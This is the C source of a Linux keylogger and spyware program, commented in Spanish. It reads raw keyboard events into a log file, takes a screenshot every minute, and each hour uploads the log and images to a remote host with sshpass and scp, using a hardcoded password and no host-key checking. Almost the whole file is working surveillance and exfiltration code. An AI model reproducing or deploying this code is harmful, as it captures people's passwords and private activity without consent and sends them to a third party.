#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <time.h> // Para obtener la fecha y hora
#include <assert.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>

// LIBRERIAS EXTERNAS
#include <X11/XKBlib.h> //-lX11
#include <cairo.h>
#include <cairo-xlib.h>

// sudo apt install libcairo2-dev
// sudo apt-get install sshpass

// PARA COMPILAR EL PROGRAMA:
// gcc main.c -o main -lX11
// gcc main.c -o main `pkg-config --cflags --libs cairo x11`

// Rutas
char *file_path = "keylog.txt";
char *folder_path = "images";

// FUNCION PARA OBTENER EL DEVICE DEL TECLADO
char *getDevice()
{
    // LEE EL ARCHIVO DEVICES Y EXTRAE EL INPUT QUE SEA DEL TECLADO
    char *command = (char *)"cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";

    static char event[8];
    FILE *pipe = popen(command, "r");

    if (!pipe)
        exit(1);

    // OBTIENE LA CADENA DE TEXTO DEL EVENTO CORRESPONDIENTE AL TECLADO
    fgets(event, 8, pipe);
    pclose(pipe);

    // RETORNA EL EVENTO ("event0" por ejemplo)
    return event;
}

// FUNCION PARA CHECAR SI LAS MAYUSCULAS ESTAN ACTIVADAS
int getCapsLock()
{
    Display *display;
    unsigned state;

    // Abre una conexión con el servidor X utilizando la variable de entorno DISPLAY
    display = XOpenDisplay(getenv("DISPLAY"));
    if (!display)
        return -1; // Retorna -1 si no se puede conectar al servidor X

    // Obtiene el estado de los indicadores del teclado (como Caps Lock, Num Lock, etc.)
    if (XkbGetIndicatorState(display, XkbUseCoreKbd, &state) != Success)
        return -2; // Retorna -2 si ocurre un error al obtener el estado

    // Imprime si Caps Lock está activado o desactivado
    // printf("Caps Lock is %s\n", (state & 1) ? "on" : "off");
    // printf("%d\n", state);

    // Cierra la conexión con el servidor X
    XCloseDisplay(display);

    return (state & 1);
}

// FUNCION PARA PASAR DEL CODIGO DE TECLA A LETRA
char *getCharacter(int code)
{

    int isCapsLockOn = getCapsLock();

    // printf("Caps Lock status: %d\n", isCapsLockOn);

    switch (code)
    {

    // LETRAS
    case KEY_A:
        return isCapsLockOn ? "A" : "a";
    case KEY_B:
        return isCapsLockOn ? "B" : "b";
    case KEY_C:
        return isCapsLockOn ? "C" : "c";
    case KEY_D:
        return isCapsLockOn ? "D" : "d";
    case KEY_E:
        return isCapsLockOn ? "E" : "e";
    case KEY_F:
        return isCapsLockOn ? "F" : "f";
    case KEY_G:
        return isCapsLockOn ? "G" : "g";
    case KEY_H:
        return isCapsLockOn ? "H" : "h";
    case KEY_I:
        return isCapsLockOn ? "I" : "i";
    case KEY_J:
        return isCapsLockOn ? "J" : "j";
    case KEY_K:
        return isCapsLockOn ? "K" : "k";
    case KEY_L:
        return isCapsLockOn ? "L" : "l";
    case KEY_M:
        return isCapsLockOn ? "M" : "m";
    case KEY_N:
        return isCapsLockOn ? "N" : "n";
    case KEY_O:
        return isCapsLockOn ? "O" : "o";
    case KEY_P:
        return isCapsLockOn ? "P" : "p";
    case KEY_Q:
        return isCapsLockOn ? "Q" : "q";
    case KEY_R:
        return isCapsLockOn ? "R" : "r";
    case KEY_S:
        return isCapsLockOn ? "S" : "s";
    case KEY_T:
        return isCapsLockOn ? "T" : "t";
    case KEY_U:
        return isCapsLockOn ? "U" : "u";
    case KEY_V:
        return isCapsLockOn ? "V" : "v";
    case KEY_W:
        return isCapsLockOn ? "W" : "w";
    case KEY_X:
        return isCapsLockOn ? "X" : "x";
    case KEY_Y:
        return isCapsLockOn ? "Y" : "y";
    case KEY_Z:
        return isCapsLockOn ? "Z" : "z";

        // NUMEROS

    case KEY_0:
        return "0";
    case KEY_1:
        return "1";
    case KEY_2:
        return "2";
    case KEY_3:
        return "3";
    case KEY_4:
        return "4";
    case KEY_5:
        return "5";
    case KEY_6:
        return "6";
    case KEY_7:
        return "7";
    case KEY_8:
        return "8";
    case KEY_9:
        return "9";

    // TECLADO NUMERICO
    case KEY_KP0:
        return "0";
    case KEY_KP1:
        return "1";
    case KEY_KP2:
        return "2";
    case KEY_KP3:
        return "3";
    case KEY_KP4:
        return "4";
    case KEY_KP5:
        return "5";
    case KEY_KP6:
        return "6";
    case KEY_KP7:
        return "7";
    case KEY_KP8:
        return "8";
    case KEY_KP9:
        return "9";

    // FUNCIONES ESPECIALES
    case KEY_ENTER:
        return "\n";
    case KEY_SPACE:
        return " ";
    case KEY_DOT:
        return ".";
    case KEY_COMMA:
        return ",";
    case KEY_MINUS:
        return "-";
    case KEY_EQUAL:
        return "=";
    case KEY_SLASH:
        return "/";
    case KEY_LEFTSHIFT:
        return " [LEFTSHIFT] ";
    case KEY_RIGHTSHIFT:
        return " [RIGHTSHIFT] ";
    case KEY_LEFTCTRL:
        return " [LEFTCTRL] ";
    case KEY_RIGHTCTRL:
        return " [RIGHTCTRL] ";
    case KEY_LEFTALT:
        return " [LEFTALT] ";
    case KEY_RIGHTALT:
        return " [RIGHTALT] ";
    case KEY_LEFT:
        return " [←] ";
    case KEY_RIGHT:
        return " [→] ";
    case KEY_UP:
        return " [↑] ";
    case KEY_DOWN:
        return " [↓] ";
    case KEY_ESC:
        return " [ESC] ";
    case KEY_TAB:
        return " [TAB] ";
    case KEY_CAPSLOCK:
        return " [CAPSLOCK] ";
    case KEY_NUMLOCK:
        return " [NUMLOCK] ";
    case KEY_BACKSPACE:
        return " [BACKSPACE] ";
    case KEY_END:
        return " [END] ";
    case KEY_PAGEDOWN:
        return " [PAGEDOWN] ";
    case KEY_INSERT:
        return " [INSERT] ";
    case KEY_DELETE:
        return " [DELETE] ";
    case KEY_PAUSE:
        return " [PAUSE] ";
    case KEY_HOMEPAGE:
        return " [HOMEPAGE] ";
    case KEY_PRINT:
        return " [PRINT] ";
    case KEY_F1:
        return " [F1] ";
    case KEY_F2:
        return " [F2] ";
    case KEY_F3:
        return " [F3] ";
    case KEY_F4:
        return " [F4] ";
    case KEY_F5:
        return " [F5] ";
    case KEY_F6:
        return " [F6] ";
    case KEY_F7:
        return " [F7] ";
    case KEY_F8:
        return " [F8] ";
    case KEY_F9:
        return " [F9] ";
    case KEY_F10:
        return " [F10] ";
    case KEY_F11:
        return " [F11] ";
    case KEY_F12:
        return " [F12] ";
    case KEY_1:
        return "!";
    case KEY_2:
        return "@";
    case KEY_3:
        return "#";
    case KEY_4:
        return "$";
    case KEY_5:
        return "%";
    case KEY_6:
        return "^";
    case KEY_7:
        return "&";
    case KEY_8:
        return "*";
    case KEY_9:
        return "(";
    case KEY_0:
        return ")";

    // TECLADO NUMERICO
    case KEY_KPENTER:
        return "\n";
    case KEY_KPDOT:
        return ".";
    case KEY_KPMINUS:
        return "-";
    case KEY_KPPLUS:
        return "+";
    case KEY_KPASTERISK:
        return "*";
    case KEY_KPSLASH:
        return "/";

    default:
        return "";
    }
}

// FUNCION QUE DETECTA LAS TECLAS PRESIONADAS
void *keylogger()
{
    // RUTA DEL TECLADO A COMPLETAR AUTOMATICAMENTE
    static char path_keyboard[20] = "/dev/input/";
    // CONCATENAR EL NOMBRE DEL DEVICE
    strcat(path_keyboard, getDevice());
    // REMOVER EL SALTO DE LINEA AL FINAL
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    // VARIABLE DEL EVENTO
    struct input_event event;
    ssize_t n;

    // PUNTERO PARA EL ARCHIVO DE LOG TXT
    FILE *logfile;

    // ABRIR EL FICHERO DEL TECLADO
    int file_device = open(path_keyboard, O_RDONLY);

    // SI NO SE PUEDE ABRIR TERMINA LA FUNCION
    if (file_device == -1)
    {
        perror("No se pudo abrir el archivo de dispositivo");
        return NULL;
    }

    // ABRIR EL LOG TXT (SI NO EXISTE SE CREA)
    logfile = fopen(file_path, "a");

    // SI NO SE PUEDE ABRIR TERMINA LA FUNCION
    if (!logfile)
    {
        perror("No se pudo abrir el archivo de registro");
        close(file_device);
        return NULL;
    }

    time_t now;
    struct tm *local_time;

    // Obtener la fecha y hora actuales
    time(&now);
    local_time = localtime(&now);

    fprintf(logfile, "KEYLOGGER ACTIVADO: %04d-%02d-%02d_%02d-%02d-%02d\n", local_time->tm_year + 1900,
            local_time->tm_mon + 1,
            local_time->tm_mday,
            local_time->tm_hour,
            local_time->tm_min,
            local_time->tm_sec);
    fflush(logfile);

    // BUCLE PARA LEER LOS EVENTOS
    while (true)
    {
        // SE LEEN LOS EVENTOS DEL TECLADO
        n = read(file_device, &event, sizeof(struct input_event));

        // SI NO SE PUEDE LEER UN EVENTO TERMINA LA FUNCION
        if (n == (ssize_t)-1)
        {
            perror("Error al leer el evento");
            fclose(logfile);
            close(file_device);
            return NULL;
        }

        // SI EL EVENTO ES UNA TECLA PRESIONADA
        if (event.type == EV_KEY && event.value == 1)
        { // 0 PARA CUANDO SE OPRIME LA TECLA, 1 PARA CUANDO SE SUELTA Y 2 PARA CUANDO SE MANTIENE
            char *character = getCharacter(event.code);
            fprintf(logfile, "%s", character);
            fflush(logfile);
        }
    }

    fclose(logfile);
    close(file_device);
    return NULL;
}

void *takeScreenshot()
{
    while (true)
    {
        Display *disp;
        Window root;
        cairo_surface_t *surface;
        int scr;
        char display_name[20] = ":0";
        char output_file[100];
        time_t now;
        struct tm *local_time;

        // Obtener la fecha y hora actuales
        time(&now);
        local_time = localtime(&now);

        mkdir(folder_path, 0777); // Crea la carpeta si no existe
        snprintf(output_file, sizeof(output_file), "%s/image_%04d-%02d-%02d_%02d-%02d-%02d.png",
                 folder_path,
                 local_time->tm_year + 1900,
                 local_time->tm_mon + 1,
                 local_time->tm_mday,
                 local_time->tm_hour,
                 local_time->tm_min,
                 local_time->tm_sec);

        /* Conectar al display especificado */
        disp = XOpenDisplay(display_name);
        if (disp == NULL)
        {
            fprintf(stderr, "Given display cannot be found, exiting: %s\n", display_name);
            return NULL;
        }

        scr = DefaultScreen(disp);
        root = DefaultRootWindow(disp);

        /* Obtener la superficie raíz en el display dado */
        surface = cairo_xlib_surface_create(disp, root, DefaultVisual(disp, scr),
                                            DisplayWidth(disp, scr),
                                            DisplayHeight(disp, scr));

        /* Guardar la imagen como PNG con la fecha y hora en el nombre */
        cairo_surface_write_to_png(surface, output_file);

        /* Liberar la memoria */
        cairo_surface_destroy(surface);

        sleep(60);
    }
}

void *sendToServer()
{
    while (true)
    {
        // Dirección del servidor y ruta destino
        char *server_user = "user";
        char *server_ip = "192.168.100.41";
        char *remote_path = "/home/user/KeyloggerFiles/";

        // Contraseña del servidor SSH
        char *password = "parrot";

        // Construye el comando scp con sshpass
        char command[512];
        snprintf(command, sizeof(command), "sshpass -p '%s' scp -o StrictHostKeyChecking=no %s %s@%s:%s", password, file_path, server_user, server_ip, remote_path);

        // Ejecuta el comando
        int result = system(command);

        if (result == 0)
        {
            printf("Archivo enviado con éxito.\n");
        }
        else
        {
            printf("Error al enviar el archivo.\n");
        }

        // Construye el comando scp con sshpass para enviar la carpeta
        char command_folder[512];
        snprintf(command_folder, sizeof(command_folder), "sshpass -p '%s' scp -o StrictHostKeyChecking=no -r %s %s@%s:%s",
                 password, folder_path, server_user, server_ip, remote_path);

        // Ejecuta el comando para enviar la carpeta
        int result_folder = system(command_folder);

        if (result_folder == 0)
        {
            printf("Carpeta enviada con éxito.\n");
        }
        else
        {
            printf("Error al enviar la carpeta.\n");
        }

        sleep(3600);
    }
}

int main()
{
    pthread_t keylogger_thread, screenshot_thread, server_thread;

    // Crear hilo para capturar las pulsaciones de teclas
    if (pthread_create(&keylogger_thread, NULL, keylogger, NULL) != 0)
    {
        perror("Error al crear el hilo de captura de teclas");
        return EXIT_FAILURE;
    }

    // Crear hilo para tomar capturas de pantalla
    if (pthread_create(&screenshot_thread, NULL, takeScreenshot, NULL) != 0)
    {
        perror("Error al crear el hilo de captura de pantalla");
        return EXIT_FAILURE;
    }

    // Crear hilo para enviar al servidor
    if (pthread_create(&server_thread, NULL, sendToServer, NULL) != 0)
    {
        perror("Error al crear el hilo de enviar al servidor");
        return EXIT_FAILURE;
    }

    pthread_join(keylogger_thread, NULL);
    pthread_join(screenshot_thread, NULL);
    pthread_join(server_thread, NULL);

    return EXIT_SUCCESS;
}